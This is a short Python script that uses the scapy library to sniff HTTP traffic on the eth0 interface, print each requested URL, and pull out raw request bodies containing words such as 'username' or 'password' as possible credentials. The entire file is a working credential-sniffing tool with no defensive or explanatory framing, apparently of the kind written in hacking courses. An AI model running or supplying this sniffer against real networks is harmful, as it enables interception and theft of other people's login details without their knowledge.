#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn= process_sniffed_packet)


def get_packet(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for key in keywords:
            if key in load:
               return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_packet(packet)
        print("[+] Http Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/password >> " + login_info)




sniff("eth0")